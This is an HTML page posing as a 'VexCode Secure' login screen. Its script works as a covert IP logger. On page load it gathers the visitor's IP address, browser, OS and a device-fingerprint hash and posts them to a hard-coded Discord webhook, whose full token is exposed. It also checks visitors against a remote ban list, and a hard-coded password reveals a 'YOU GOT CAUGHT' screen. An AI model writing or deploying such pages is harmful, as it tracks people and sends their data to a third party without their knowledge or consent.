<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Access | VexCode</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #03050a;
      font-family: 'Courier New', monospace;
      color: #4db8ff;
      overflow: hidden;
    }
    #v_ { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
    .wrapper {
      padding: 2px;
      border-radius: 24px;
      background: linear-gradient(135deg, #1e90ff, #00c6ff, #1e90ff);
      box-shadow: 0 0 35px rgba(0, 150, 255, 0.25);
      z-index: 10;
    }
    .terminal {
      width: 360px;
      padding: 30px;
      background: #0b1220;
      border-radius: 20px;
      box-shadow: inset 0 0 20px rgba(0, 140, 255, 0.2), 0 15px 30px rgba(0, 0, 0, 0.6);
      text-align: center;
    }
    /* Hidden by default so they don't overlap the login */
    #gate_msg, #caught_msg { display: none; }

    h2 {
      margin: 0 0 20px 0;
      letter-spacing: 2px;
      font-size: 16px;
      text-transform: uppercase;
      color: #00c6ff;
      text-shadow: 0 0 8px rgba(0, 198, 255, 0.6);
    }
    .sysinfo-panel {
      background: #050a16;
      border: 1px solid #1e90ff;
      border-radius: 12px;
      padding: 12px;
      margin-bottom: 20px;
      font-size: 11px;
      text-align: left;
      color: #8cbaff;
      box-shadow: inset 0 0 8px rgba(0,100,255,0.3);
    }
    .sysinfo-row {
      display: flex;
      justify-content: space-between;
      padding: 4px 0;
      border-bottom: 1px dotted #1e4f7a;
    }
    .sysinfo-row:last-child { border-bottom: none; }
    .sysinfo-label { opacity: 0.7; letter-spacing: 0.5px; }
    .sysinfo-value { font-weight: bold; color: #00ffb3; max-width: 180px; overflow: hidden; text-overflow: ellipsis; }
    .badge {
      display: inline-block;
      background: #1e3a5f;
      padding: 4px 10px;
      border-radius: 30px;
      font-size: 10px;
      color: #b3d9ff;
      margin: 10px 0 5px;
    }
    label { font-size: 11px; opacity: 0.7; display: block; text-align: left; margin-left: 5px; }
    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0 15px 0;
      background: #050a16;
      border: 1px solid #1e90ff;
      border-radius: 10px;
      color: #4db8ff;
      box-sizing: border-box;
      outline: none;
      transition: 0.3s;
    }
    input:focus { border-color: #00c6ff; box-shadow: 0 0 8px rgba(0, 198, 255, 0.6); }
    button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 12px;
      background: linear-gradient(90deg, #1e90ff, #00c6ff);
      font-weight: bold;
      letter-spacing: 1px;
      cursor: pointer;
      color: #001428;
      transition: 0.3s;
      text-transform: uppercase;
      margin-top: 10px;
    }
    button:hover { box-shadow: 0 0 12px rgba(0, 198, 255, 0.8); transform: translateY(-1px); }
    .footer { margin-top: 15px; font-size: 10px; opacity: 0.5; }
    #err_msg { color: #ff4d4d; font-size: 10px; margin-bottom: 10px; height: 12px; }
    .webhook-status { font-size: 9px; color: #557c9f; margin-top: 5px; }
    .caught-message {
      color: #ff5555;
      font-size: 24px;
      font-weight: bold;
      text-transform: uppercase;
      margin: 30px 0;
      text-shadow: 0 0 15px #ff0000;
      animation: pulse 1s infinite;
    }
    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
  </style>
</head>
<body>

<canvas id="v_"></canvas>

<div class="wrapper">
  <div id="gate_msg" class="terminal">
    <h2 style="color:#ff4d4d;">⛔ ACCESS REVOKED</h2>
    <div id="ban_reason" style="color: #ff5555; font-size: 12px; margin-bottom: 15px;">DEVICE FINGERPRINT LOCKED</div>
    <div class="sysinfo-panel" style="color:#ff8888;">
      <div class="sysinfo-row"><span class="sysinfo-label">IP</span><span class="sysinfo-value" id="ban_ip">-</span></div>
      <div class="sysinfo-row"><span class="sysinfo-label">DEVICE</span><span class="sysinfo-value" id="ban_device">-</span></div>
      <div class="sysinfo-row"><span class="sysinfo-label">HWID</span><span class="sysinfo-value" id="ban_hwid">-</span></div>
    </div>
    <div class="footer">🔒 BAN ENFORCED</div>
  </div>

  <div id="caught_msg" class="terminal">
    <h2 style="color:#ff5555;">⚠️ ACCESS GRANTED</h2>
    <div class="caught-message">YOU GOT CAUGHT</div>
    <div class="sysinfo-panel" style="color:#ff8888;">
      <div class="sysinfo-row"><span class="sysinfo-label">IP</span><span class="sysinfo-value" id="caught_ip">-</span></div>
      <div class="sysinfo-row"><span class="sysinfo-label">DEVICE</span><span class="sysinfo-value" id="caught_device">-</span></div>
      <div class="sysinfo-row"><span class="sysinfo-label">HWID</span><span class="sysinfo-value" id="caught_hwid">-</span></div>
    </div>
    <div class="footer">🔒 DATA LOGGED TO DISCORD</div>
  </div>

  <div id="login_ui" class="terminal">
    <h2>⚡ VexCode Secure</h2>
    <div id="err_msg"></div>
    
    <div class="badge">🔍 SYSTEM FINGERPRINT</div>
    <div class="sysinfo-panel">
      <div class="sysinfo-row"><span class="sysinfo-label">IP</span><span class="sysinfo-value" id="display_ip">loading...</span></div>
      <div class="sysinfo-row"><span class="sysinfo-label">DEVICE</span><span class="sysinfo-value" id="display_device">-</span></div>
      <div class="sysinfo-row"><span class="sysinfo-label">OS</span><span class="sysinfo-value" id="display_os">-</span></div>
      <div class="sysinfo-row"><span class="sysinfo-label">ID</span><span class="sysinfo-value" id="display_id">-</span></div>
    </div>
    <div class="webhook-status" id="webhook_ack">⚡ initializing...</div>

    <label>ENTER PASSWORD</label>
    <input type="password" id="password_input" placeholder="••••••••" autocomplete="off">
    <button id="auth_btn">▶ SUBMIT</button>
    <div class="footer">SECURE CHANNEL · v.5</div>
  </div>
</div>

<script>
(function() {
  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1477568166681903166/PJlF61ClzxqXVf65w6jtZeUHUPew8Vk7h4THfp_drir0REEJqqNgYs22HrV8iVZKlomV';
  const BLACKLIST_URL = 'https://gist.githubusercontent.com/VexCodeV2/f4081441720e8b72f60bbc6046e39371/raw/blacklist.json';
  const CORRECT_PASSWORD = "1234";

  let currentIP = '0.0.0.0';
  let isFingerprintSent = false;
  const BAN_LIST = { ips: new Set(), deviceIds: new Set(), browsers: new Set(), os: new Set() };

  // --- Utility Functions ---
  function getBrowser() {
    const ua = navigator.userAgent;
    if (ua.includes('Chrome')) return 'Chrome';
    if (ua.includes('Firefox')) return 'Firefox';
    if (ua.includes('Safari')) return 'Safari';
    return 'Unknown';
  }

  function getOS() {
    const ua = navigator.userAgent;
    if (ua.includes('Windows')) return 'Windows';
    if (ua.includes('Mac')) return 'macOS';
    if (ua.includes('Linux')) return 'Linux';
    if (ua.includes('Android')) return 'Android';
    if (ua.includes('iPhone')) return 'iOS';
    return 'Unknown OS';
  }

  function generateDeviceId() {
    // FIX: Renamed 'screen' variable to 's' to avoid naming conflicts
    const s = window.screen;
    const base = `${navigator.userAgent}${s.width}${s.height}${s.colorDepth}${navigator.language}`;
    let hash = 0;
    for (let i = 0; i < base.length; i++) {
      hash = ((hash << 5) - hash) + base.charCodeAt(i);
      hash |= 0;
    }
    return Math.abs(hash).toString(16) + "vx";
  }

  // --- Core Logic ---
  async function fetchBanList() {
    try {
      const r = await fetch(BLACKLIST_URL + '?t=' + Date.now());
      const data = await r.json();
      if(data.banned_ips) data.banned_ips.forEach(i => BAN_LIST.ips.add(i));
      if(data.banned_device_ids) data.banned_device_ids.forEach(i => BAN_LIST.deviceIds.add(i));
      document.getElementById('webhook_ack').innerText = '📋 ban list active';
    } catch (e) {
      document.getElementById('webhook_ack').innerText = '⚠️ offline mode';
    }
  }

  function sendToDiscord(type) {
    const embed = {
      title: type === 'ban' ? '🚫 BAN TRIGGERED' : (type === 'caught' ? '🎯 GOT CAUGHT' : '👁️ NEW VISITOR'),
      color: type === 'ban' ? 0xff5555 : (type === 'caught' ? 0xffaa00 : 0x00c6ff),
      fields: [
        { name: 'IP', value: currentIP, inline: true },
        { name: 'OS', value: getOS(), inline: true },
        { name: 'HWID', value: generateDeviceId(), inline: false }
      ],
      timestamp: new Date().toISOString()
    };
    fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  }

  function checkBan() {
    const id = generateDeviceId();
    if (BAN_LIST.ips.has(currentIP) || BAN_LIST.deviceIds.has(id)) {
      document.getElementById('login_ui').style.display = 'none';
      document.getElementById('gate_msg').style.display = 'block';
      document.getElementById('ban_ip').textContent = currentIP;
      document.getElementById('ban_hwid').textContent = id;
      document.getElementById('ban_device').textContent = getBrowser();
      return true;
    }
    return false;
  }

  // --- Execution ---
  const deviceID = generateDeviceId();
  document.getElementById('display_id').textContent = deviceID;
  document.getElementById('display_os').textContent = getOS();
  document.getElementById('display_device').textContent = getBrowser();

  fetchBanList().then(() => {
    fetch('https://api.ipify.org?format=json')
      .then(r => r.json())
      .then(data => {
        currentIP = data.ip;
        document.getElementById('display_ip').textContent = currentIP;
        if (!checkBan() && !isFingerprintSent) {
          sendToDiscord('visit');
          isFingerprintSent = true;
        }
      });
  });

  document.getElementById('auth_btn').onclick = function() {
    const pass = document.getElementById('password_input').value;
    if (pass === CORRECT_PASSWORD) {
      document.getElementById('login_ui').style.display = 'none';
      document.getElementById('caught_msg').style.display = 'block';
      document.getElementById('caught_ip').textContent = currentIP;
      document.getElementById('caught_hwid').textContent = deviceID;
      document.getElementById('caught_device').textContent = getBrowser();
      sendToDiscord('caught');
    } else {
      document.getElementById('err_msg').textContent = 'ACCESS DENIED';
    }
  };

  // Matrix Background logic
  const c = document.getElementById('v_');
  const x = c.getContext('2d');
  function resize() { c.width = window.innerWidth; c.height = window.innerHeight; }
  window.onresize = resize; resize();
  const drops = Array(200).fill(1);
  setInterval(() => {
    x.fillStyle = 'rgba(3, 5, 10, 0.15)'; x.fillRect(0,0,c.width,c.height);
    x.fillStyle = '#1e90ff';
    drops.forEach((y, i) => {
      x.fillText(String.fromCharCode(0x30A0 + Math.random()*96), i*20, y*20);
      if (y*20 > c.height && Math.random() > 0.975) drops[i] = 0;
      drops[i]++;
    });
  }, 35);
})();
</script>
</body>
</html>
